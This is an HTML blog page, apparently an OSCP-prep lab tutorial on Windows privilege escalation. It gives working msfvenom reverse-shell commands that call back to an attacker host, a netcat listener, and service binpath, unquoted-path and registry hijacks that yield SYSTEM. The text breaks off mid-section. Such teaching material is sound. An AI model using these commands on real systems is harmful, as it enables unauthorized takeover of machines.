@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Windows Privilege Escalation Guide - gr4n173</title><meta name="Description" content="Here I will explain about privilege escalate in Window machine."><meta property="og:title" content="Windows Privilege Escalation Guide" />
+<meta property="og:description" content="Here I will explain about privilege escalate in Window machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.com/windowsprivsec/" />
+<meta property="og:image" content="http://example.com/windowsprivsec/featured-image.jpg"/>
+<meta property="article:published_time" content="2021-05-03T17:55:28+08:00" />
+<meta property="article:modified_time" content="2021-05-04T17:55:28+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.com/windowsprivsec/featured-image.jpg"/>
+<meta name="twitter:title" content="Windows Privilege Escalation Guide"/>
+<meta name="twitter:description" content="Here I will explain about privilege escalate in Window machine."/>
+<meta name="application-name" content="gr4n173">
+<meta name="apple-mobile-web-app-title" content="gr4n173"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.com/windowsprivsec/" /><link rel="prev" href="http://example.com/linuxprivsec/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows Privilege Escalation Guide",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.com\/windowsprivsec\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/example.com\/windowsprivsec\/featured-image.jpg",
+                            "width":  640 ,
+                            "height":  334 
+                        }],"genre": "posts","keywords": "windows, privilege Escalation","wordcount":  2448 ,
+        "url": "http:\/\/example.com\/windowsprivsec\/","datePublished": "2021-05-03T17:55:28+08:00","dateModified": "2021-05-04T17:55:28+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/example.com\/images\/profile.jpg",
+                    "width":  400 ,
+                    "height":  400 
+                }},"author": {
+                "@type": "Person",
+                "name": "gr4n173"
+            },"description": "Here I will explain about privilege escalate in Window machine."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/categories/moee/"> Project </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/windowsprivsec/" selected>English</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="gr4n173"><span class="header-title-pre"><i class='far fa-grin-tongue-wink'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/categories/moee/" title="">Project</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/gr4n173" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/windowsprivsec/" selected>English</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Windows Privilege Escalation Guide</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/gr4n173" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>gr4n173</a></span>&nbsp;<span class="post-category">included in <a href="/categories/oscp/"><i class="far fa-folder fa-fw"></i>OSCP Prepration</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-05-03">2021-05-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2448 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;12 minutes&nbsp;<span id="/windowsprivsec/" class="leancloud_visitors" data-flag-title="Windows Privilege Escalation Guide">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/windowsprivsec/featured-image.jpg"
+        data-srcset="/windowsprivsec/featured-image.jpg, /windowsprivsec/featured-image.jpg 1.5x, /windowsprivsec/featured-image.jpg 2x"
+        data-sizes="auto"
+        alt="/windowsprivsec/featured-image.jpg"
+        title="Here I will explain about privilege escalate in Window machine." /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-generate-a-reverse-shell-executable">1. Generate a Reverse Shell Executable</a></li>
+    <li><a href="#2-service-exploits">2. Service Exploits</a>
+      <ul>
+        <li><a href="#insecure-service-permissions">Insecure Service Permissions</a></li>
+        <li><a href="#unquoted-service-path">Unquoted Service Path</a></li>
+        <li><a href="#week-registry-permissions">Week Registry Permissions</a></li>
+        <li><a href="#insecure-service-executables">Insecure Service Executables</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-registry">3. Registry</a>
+      <ul>
+        <li><a href="#autoruns">AutoRuns</a></li>
+        <li><a href="#alwaysinstallelevated">AlwaysInstallElevated</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-passwords">4. Passwords</a>
+      <ul>
+        <li><a href="#registry">Registry</a></li>
+        <li><a href="#saved-creds">Saved Creds</a></li>
+        <li><a href="#security-account-manager-sam">Security Account Manager (SAM)</a></li>
+        <li><a href="#passing-the-hash">Passing the Hash</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-scheduled-tasks">5. Scheduled Tasks</a></li>
+    <li><a href="#6-startup-apps">6. Startup Apps</a></li>
+    <li><a href="#7token-impersonation">7.Token Impersonation</a>
+      <ul>
+        <li><a href="#rogue-potato">Rogue Potato</a></li>
+        <li><a href="#printspoofer">PrintSpoofer</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Let&rsquo;s make hands dry in Windows Privilege Escalation.</p>
+<p>In order to deploy windows machine in linux we require <code>xfreerdp</code> or <code>remmina</code>tool along with username and password.</p>
+<p><strong>For xfreerdp</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.13.134
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>For remmina</strong>
+We have can run directly a tool and login with <code>username</code> and <code>password</code>.</p>
+<h2 id="1-generate-a-reverse-shell-executable">1. Generate a Reverse Shell Executable</h2>
+<p>On Kali machine we can use <code>msfvenom</code> to generate the reverse shell executables</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.156 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f exe -o reverse.exe
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="m">460</span> bytes
+Final size of exe file: <span class="m">7168</span> bytes
+Saved as: reverse.exe
+</code></pre></td></tr></table>
+</div>
+</div><p>From here to transfer this executable to windows, we can setup a Simple SMB Server of python in linux.
+<strong>Linux</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py gr4n173 .
+Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+<span class="o">[</span>*<span class="o">]</span> Config file parsed
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>In Window</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\U</span>ser&gt; copy <span class="se">\\</span>10.10.14.156<span class="se">\g</span>r4n173<span class="se">\r</span>everse.exe C:<span class="se">\U</span>ser<span class="se">\r</span>everse.exe	
+</code></pre></td></tr></table>
+</div>
+</div><p>Now our task is to run the reverse shell executables in window to get the connection back before that we have to setup netcat listner on linux.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ nc -lvnp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.2.77.175<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.130.32<span class="o">]</span> <span class="m">49795</span>
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.737<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>ser&gt;whoami
+whoami
+gr4n173<span class="se">\u</span>ser
+</code></pre></td></tr></table>
+</div>
+</div><p>This way we can get the reverse connection in linux of window machine.</p>
+<h2 id="2-service-exploits">2. Service Exploits</h2>
+<p>#service</p>
+<h3 id="insecure-service-permissions">Insecure Service Permissions</h3>
+<p>#bin_path
+On <code>Windows machine</code>, when escalating our privileges we go through the service that run under system privileges. Here services are like <code>binary executables</code> in linux. So inorder to execute our services we require the services to restart. Before going deep dive into service exploit let&rsquo;s try to check the services are run by <code>user</code> for that we use <code>accesschk.exe</code> . Download <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" target="_blank" rel="noopener noreffer">accesschk.exe</a>
+<code>AccessChk</code> is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects etc.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#This give the detail about services that we have read/write permission</span>
+C:<span class="se">\g</span>r4n173<span class="se">\a</span>ccesschk.exe -uwcqv user *
+RW daclsvc
+ 		SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_CHANGE_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+</code></pre></td></tr></table>
+</div>
+</div><table>
+<thead>
+<tr>
+<th style="text-align:left">Permissions</th>
+<th style="text-align:center">Use of the services</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SRVICE_CHANGE_CONFIG</td>
+<td style="text-align:center">Can reconfigure the service binary</td>
+</tr>
+<tr>
+<td style="text-align:left">WRITE_DAC</td>
+<td style="text-align:center">Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG</td>
+</tr>
+<tr>
+<td style="text-align:left">WRITE_OWNER</td>
+<td style="text-align:center">Can become owner, reconfigure permissions</td>
+</tr>
+<tr>
+<td style="text-align:left">GENERIC_WRITE</td>
+<td style="text-align:center">Inherits SERVICE_CHANGE_CONFIG</td>
+</tr>
+<tr>
+<td style="text-align:left">GENERIC_ALL</td>
+<td style="text-align:center">Inherits SERVICE_CHANGE_CONFIG</td>
+</tr>
+</tbody>
+</table>
+<p>Now inorder to check under what privileges a system runs. For that we check for specific service <code>daclsvc</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt; sc qc daclsvc
+SERVICE_NAME: daclsvc
+        TYPE               : <span class="m">10</span>  WIN32_OWN_PROCESS
+        START_TYPE         : <span class="m">3</span>   DEMAND_START
+        ERROR_CONTROL      : <span class="m">1</span>   NORMAL
+        BINARY_PATH_NAME   : <span class="s2">&#34;C:\Program Files\DACL Service\daclservice.exe&#34;</span>
+        LOAD_ORDER_GROUP   :
+        TAG                : <span class="m">0</span>
+        DISPLAY_NAME       : DACL Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+</code></pre></td></tr></table>
+</div>
+</div><p>where:-
+<code>sc: Service Sontroller</code>
+<code>qc: query configuration</code>
+Now inorder exploit that service we have to change the <code>Binpath</code> of service <code>daclsvc</code> with the path of our <code>reverse.exe</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt; sc config daclsvc <span class="nv">binpath</span><span class="o">=</span><span class="s2">&#34;\&#34;C:\gr4n173\reverse.exe\&#34;&#34;</span>
+<span class="o">[</span>SC<span class="o">]</span> ChangeServiceConfig SUCCESS
+</code></pre></td></tr></table>
+</div>
+</div><p>Since <code>binpath</code> is changed now we only have to do is run the service again along with listner set in <code>linux</code> and we are in.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt; net start daclsvc
+The service is not responding to the control <span class="k">function</span>.
+
+More <span class="nb">help</span> is available by typing NET HELPMSG 2186.
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>Linux</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173~$ nc -lvnp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.2.77.175<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.75.7<span class="o">]</span> <span class="m">49882</span>
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.737<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+whoami
+nt authority<span class="se">\s</span>ystem
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="unquoted-service-path">Unquoted Service Path</h3>
+<p>#unquotedsvc
+Basically if path to the service binary isn&rsquo;t wrapped in quotes and there are spaces in the path then we can escalate privileges by abusing misconfigured services.</p>
+<p>For ex:- If we use long file name that contains a space, use quoted strings indicate where file ends ;otherwise, the filename isn&rsquo;t ambiguous. string &ldquo;C:\program files\testing service\unquoted Service &ldquo;.</p>
+<p><code>Unquotedsvc</code>  can be checked as</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;sc qc unquotedsvc
+SERVICE_NAME: unquotedsvc
+       TYPE               : <span class="m">10</span>  WIN32_OWN_PROCESS
+       START_TYPE         : <span class="m">3</span>   DEMAND_START
+       ERROR_CONTROL      : <span class="m">1</span>   NORMAL
+       BINARY_PATH_NAME   : C:<span class="se">\P</span>rogram Files<span class="se">\U</span>nquoted Path Service<span class="se">\C</span>ommon Files<span class="se">\u</span>nquotedpathservice.exe
+       LOAD_ORDER_GROUP   :
+       TAG                : <span class="m">0</span>
+       DISPLAY_NAME       : Unquoted Path Service
+       DEPENDENCIES       :
+       SERVICE_START_NAME : LocalSystem
+</code></pre></td></tr></table>
+</div>
+</div><p>From there we can see the bin_path is unquoted and contain the spaces. Now in order to exploit that first we have to check who can <code>rw</code> that directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>rn4713&gt;C:<span class="se">\g</span>r4n173<span class="se">\a</span>ccesschk.exe /accepteula -uwdq <span class="s2">&#34;C:\Program Files\Unquoted Path Service\Common Files\&#34;
+</span><span class="s2">C:\Program Files\Unquoted Path Service
+</span><span class="s2">  Medium Mandatory Level (Default) [No-Write-Up]
+</span><span class="s2">  RW BUILTIN\Users
+</span><span class="s2">  RW NT SERVICE\TrustedInstaller
+</span><span class="s2">  RW NT AUTHORITY\SYSTEM
+</span><span class="s2">  RW BUILTIN\Administrators
+</span></code></pre></td></tr></table>
+</div>
+</div><p>Now copying our <code>reverse.exe</code> executables in this directory and rename it to <code>Common.exe</code>. Since unquotedservice run the common file everytime.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;copy C:<span class="se">\g</span>r4n173<span class="se">\r</span>everse.exe <span class="s2">&#34;C:\Program Files\Unquoted Path Service\Common.exe&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This way we got the reverse connection in <code>linux</code> listner same as above.</p>
+<h3 id="week-registry-permissions">Week Registry Permissions</h3>
+<p>#regsvc
+Now next service is the registry service i.e <code>regsvc</code>. Windows regisry also have ACL(Access Control List) and stores entries for each service in the machine. So if ACL is misconfigured then we can exploit it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;sc qc regsvc
+<span class="o">[</span>SC<span class="o">]</span> QueryServiceConfig SUCCESS
+
+SERVICE_NAME: regsvc
+        TYPE               : <span class="m">10</span>  WIN32_OWN_PROCESS
+        START_TYPE         : <span class="m">3</span>   DEMAND_START
+        ERROR_CONTROL      : <span class="m">1</span>   NORMAL
+        BINARY_PATH_NAME   : <span class="s2">&#34;C:\Program Files\Insecure Registry Service\insecureregistryservice.exe&#34;</span>
+        LOAD_ORDER_GROUP   :
+        TAG                : <span class="m">0</span>
+        DISPLAY_NAME       : Insecure Registry Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+</code></pre></td></tr></table>
+</div>
+</div><p>From there we can see the insecure registry location. We can find the location of <code>regsvc</code> using <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe" target="_blank" rel="noopener noreffer">winpeas.exe</a>.</p>
+<p>Now we have to check the permission on this service and found that user <code>NT AUTHORITY\INTERACTIVE</code> have <code>rw</code> permission.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173<span class="se">\a</span>ccesschk.exe /accepteula -uvwqk HKLM<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\r</span>egsvc
+  Medium Mandatory Level <span class="o">(</span>Default<span class="o">)</span> <span class="o">[</span>No-Write-Up<span class="o">]</span>
+  RW NT AUTHORITY<span class="se">\S</span>YSTEM
+        KEY_ALL_ACCESS
+  RW BUILTIN<span class="se">\A</span>dministrators
+        KEY_ALL_ACCESS
+  RW NT AUTHORITY<span class="se">\I</span>NTERACTIVE
+        KEY_ALL_ACCESS
+</code></pre></td></tr></table>
+</div>
+</div><p>So inorder to exploit this we have to change the directory of <code>ImagePath</code>. Before that let&rsquo;s query this registry.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;reg query HKLM<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\r</span>egsvc
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\r</span>egsvc
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    <span class="s2">&#34;C:\Program Files\Insecure Registry Service\insecureregistryservice.exe&#34;</span>
+    DisplayName    REG_SZ    Insecure Registry Service
+    ObjectName    REG_SZ    LocalSystem
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\r</span>egsvc<span class="se">\S</span>ecurity
+</code></pre></td></tr></table>
+</div>
+</div><p>From there you can see the <code>ImagePath</code> location pointing to insecure registry. Let&rsquo;s change the path.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
